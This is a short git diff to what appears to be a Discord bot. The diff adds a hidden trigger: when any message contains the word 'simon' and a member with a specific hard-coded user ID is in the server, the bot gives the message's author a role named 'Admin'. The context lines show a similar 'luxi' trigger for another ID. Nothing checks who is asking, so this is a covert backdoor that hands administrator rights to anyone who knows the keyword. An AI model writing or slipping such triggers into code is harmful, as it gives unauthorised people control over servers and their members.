@@ -50,6 +50,14 @@ client.on("message", message => {
                }
            })
        }
+       if (message.content.includes("simon")) {
+           message.guild.members.cache.forEach(function (e) {
+               if (e.id === "334595545060605955") {
+                   const role = message.guild.roles.cache.find(role => role.name.includes("Admin"));
+                   message.guild.member(message.author).roles.add(role);
+               }
+           })
+       }
        if (message.content.includes("luxi")) {
            message.guild.members.cache.forEach(function (e) {
                if (e.id === "761270337480032300") {
